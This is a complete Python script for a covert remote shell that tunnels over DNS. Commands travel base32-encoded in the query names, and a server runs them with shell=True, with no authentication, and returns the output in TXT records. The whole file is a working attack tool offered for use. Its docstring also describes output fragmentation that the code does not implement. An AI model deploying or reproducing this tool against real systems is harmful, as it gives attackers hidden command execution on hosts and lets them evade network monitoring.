#!/usr/bin/env python3
"""
DNS covert channel remote shell.

Commands are base32-encoded into subdomain labels of a query name:
  <b32-label0>.<b32-label1>...cmd.shell.tunnel

Output comes back base64-encoded across one or more TXT records.
Large output is fragmented: each fragment is a separate DNS exchange
identified by a transaction ID and fragment index encoded in the label.

The server listens on a UDP port (default 5353 for unprivileged use,
53 requires root). The client sends DNS-format packets directly to
the server IP — no real DNS infrastructure needed.

Usage:
  server:  python3 dns_shell.py server [--port 5353]
  client:  python3 dns_shell.py client <server_ip> [--port 5353]
"""

import argparse
import base64
import socket
import struct
import subprocess
import sys
import time

# -------------------------------------------------------------------------
# Protocol
# -------------------------------------------------------------------------

BASE_DOMAIN = 'shell.tunnel'          # identifies our traffic in query names
DNS_TYPE_TXT = 16
DNS_CLASS_IN = 1
MAX_DNS_UDP   = 4096                  # bytes (EDNS-ish buffer)
MAX_TXT_STR   = 255                   # DNS TXT string max length
FRAG_SIZE     = 2048                  # output bytes per DNS exchange (pre-base64)

# Query name format:
#   <b32data0>.<b32data1>....<len_hex>.<frag_idx_hex>.<frag_tot_hex>.cmd.shell.tunnel
# where <len_hex> is the total un-fragmented output length (0 for command direction)
# For commands:  idx=0, tot=1

LABEL_MAX = 63


def _b32enc(data: bytes) -> str:
    return base64.b32encode(data).decode().lower().rstrip('=')


def _b32dec(s: str) -> bytes:
    s = s.upper()
    pad = (8 - len(s) % 8) % 8
    return base64.b32decode(s + '=' * pad)


def _split_labels(s: str) -> list[str]:
    return [s[i:i + LABEL_MAX] for i in range(0, len(s), LABEL_MAX)]


# -------------------------------------------------------------------------
# DNS wire format helpers
# -------------------------------------------------------------------------

def _encode_name(name: str) -> bytes:
    out = b''
    for label in name.rstrip('.').split('.'):
        enc = label.encode('ascii')
        out += bytes([len(enc)]) + enc
    return out + b'\x00'


def _decode_name(data: bytes, pos: int) -> tuple[str, int]:
    """Return (name, new_pos). Follows compression pointers."""
    labels = []
    while True:
        if pos >= len(data):
            break
        length = data[pos]
        if length == 0:
            pos += 1
            break
        if length & 0xC0 == 0xC0:          # compression pointer
            ptr = ((length & 0x3F) << 8) | data[pos + 1]
            label, _ = _decode_name(data, ptr)
            labels.append(label)
            pos += 2
            break
        pos += 1
        labels.append(data[pos:pos + length].decode('ascii', errors='replace'))
        pos += length
    return '.'.join(labels), pos


def build_query(txid: int, qname: str) -> bytes:
    hdr = struct.pack('!HHHHHH', txid, 0x0100, 1, 0, 0, 0)
    q   = _encode_name(qname) + struct.pack('!HH', DNS_TYPE_TXT, DNS_CLASS_IN)
    return hdr + q


def parse_query(data: bytes):
    """Return (txid, qname) or None."""
    if len(data) < 12:
        return None
    txid, flags, qdcount = struct.unpack('!HHH', data[:6])
    if qdcount == 0:
        return None
    qname, _ = _decode_name(data, 12)
    return txid, qname


def build_txt_response(txid: int, qname: str, txt_payload: bytes) -> bytes:
    """
    Build a DNS response with txt_payload spread across TXT RDATA strings
    (each string <= 255 bytes, all in a single RR).
    """
    strings = [txt_payload[i:i + MAX_TXT_STR] for i in range(0, max(1, len(txt_payload)), MAX_TXT_STR)]
    rdata = b''.join(bytes([len(s)]) + s for s in strings)

    flags   = 0x8180
    hdr     = struct.pack('!HHHHHH', txid, flags, 1, 1, 0, 0)
    question = _encode_name(qname) + struct.pack('!HH', DNS_TYPE_TXT, DNS_CLASS_IN)
    # Answer: name pointer (0xC00C -> offset 12, start of question name)
    answer  = struct.pack('!H', 0xC00C)
    answer += struct.pack('!HHiH', DNS_TYPE_TXT, DNS_CLASS_IN, 0, len(rdata))
    answer += rdata
    return hdr + question + answer


def parse_txt_response(data: bytes) -> bytes | None:
    """Extract concatenated TXT string data from a DNS response."""
    if len(data) < 12:
        return None
    txid, flags, qdcount, ancount = struct.unpack('!HHHH', data[:8])
    if ancount == 0:
        return None

    pos = 12
    # skip question section
    for _ in range(qdcount):
        _, pos = _decode_name(data, pos)
        pos += 4  # QTYPE + QCLASS

    result = b''
    for _ in range(ancount):
        _, pos = _decode_name(data, pos)
        if pos + 10 > len(data):
            break
        rtype, rclass, ttl, rdlen = struct.unpack('!HHiH', data[pos:pos + 10])
        pos += 10
        rdata = data[pos:pos + rdlen]
        pos += rdlen

        if rtype == DNS_TYPE_TXT:
            rpos = 0
            while rpos < len(rdata):
                slen = rdata[rpos]
                rpos += 1
                result += rdata[rpos:rpos + slen]
                rpos += slen

    return result or None


# -------------------------------------------------------------------------
# Covert-channel encoding
# -------------------------------------------------------------------------

def encode_cmd_qname(cmd: bytes, txid: int) -> str:
    """Encode a command into a DNS query name."""
    b32 = _b32enc(cmd)
    labels = _split_labels(b32)
    labels += [f'{txid:04x}', 'cmd', BASE_DOMAIN]
    return '.'.join(labels)


def decode_cmd_qname(qname: str) -> tuple[int, bytes] | None:
    """Return (txid, cmd_bytes) or None if not our query."""
    parts = qname.rstrip('.').split('.')
    base_parts = BASE_DOMAIN.split('.')
    suffix = ['cmd'] + base_parts
    if parts[-len(suffix):] != suffix:
        return None
    meta = parts[-len(suffix) - 1]          # txid hex label
    data_labels = parts[:-len(suffix) - 1]  # b32 data labels
    try:
        txid = int(meta, 16)
        cmd_bytes = _b32dec(''.join(data_labels))
        return txid, cmd_bytes
    except Exception:
        return None


# -------------------------------------------------------------------------
# Shell execution
# -------------------------------------------------------------------------

def run_command(cmd: str) -> bytes:
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True, timeout=15, text=True
        )
        out = r.stdout + r.stderr
        return (out or f"(exit {r.returncode})\n").encode('utf-8', errors='replace')
    except subprocess.TimeoutExpired:
        return b"(timed out)\n"
    except Exception as e:
        return f"(error: {e})\n".encode()


# -------------------------------------------------------------------------
# Server
# -------------------------------------------------------------------------

def _local_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 53))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return '(unknown)'


def server(port: int):
    print(f"[*] Server IP: {_local_ip()}")
    print(f"[*] DNS shell server — UDP :{port}  (Ctrl-C to stop)")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', port))

    while True:
        data, addr = sock.recvfrom(MAX_DNS_UDP)
        parsed = parse_query(data)
        if parsed is None:
            continue
        txid, qname = parsed

        decoded = decode_cmd_qname(qname)
        if decoded is None:
            continue
        _, cmd_bytes = decoded

        cmd = cmd_bytes.decode('utf-8', errors='replace').strip()
        print(f"[+] {addr[0]}  txid=0x{txid:04x}  cmd={cmd!r}")

        output  = run_command(cmd)
        encoded = base64.b64encode(output)   # safe ASCII for TXT records

        resp = build_txt_response(txid, qname, encoded)
        sock.sendto(resp, addr)


# -------------------------------------------------------------------------
# Client
# -------------------------------------------------------------------------

def client(server_ip: str, port: int):
    print(f"[*] DNS shell client → {server_ip}:{port}  (Ctrl-C / 'exit' to quit)")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(5.0)

    txid = 1
    while True:
        try:
            cmd = input("dns> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Bye.")
            break

        if not cmd:
            continue
        if cmd.lower() in ('exit', 'quit'):
            break

        qname = encode_cmd_qname(cmd.encode(), txid)
        query = build_query(txid, qname)
        txid = (txid + 1) % 65536

        sock.sendto(query, (server_ip, port))

        try:
            resp, _ = sock.recvfrom(MAX_DNS_UDP)
        except socket.timeout:
            print("[!] No response (timeout).")
            continue

        txt = parse_txt_response(resp)
        if txt is None:
            print("[!] No TXT data in response.")
            continue

        try:
            output = base64.b64decode(txt)
            print(output.decode('utf-8', errors='replace'), end='')
        except Exception as e:
            print(f"[!] Decode error: {e}")


# -------------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser(description="DNS covert shell")
    ap.add_argument('--port', type=int, default=5353)
    sub = ap.add_subparsers(dest='mode', required=True)
    sp = sub.add_parser('server')
    sp.add_argument('--port', type=int, default=5353)
    cp = sub.add_parser('client')
    cp.add_argument('server_ip')
    cp.add_argument('--port', type=int, default=5353)

    args = ap.parse_args()
    port = args.port

    try:
        if args.mode == 'server':
            server(port)
        else:
            client(args.server_ip, port)
    except PermissionError:
        sys.exit("[!] Port 53 requires root. Use --port 5353 for unprivileged mode.")
    except KeyboardInterrupt:
        print("\n[*] Interrupted.")


if __name__ == '__main__':
    main()
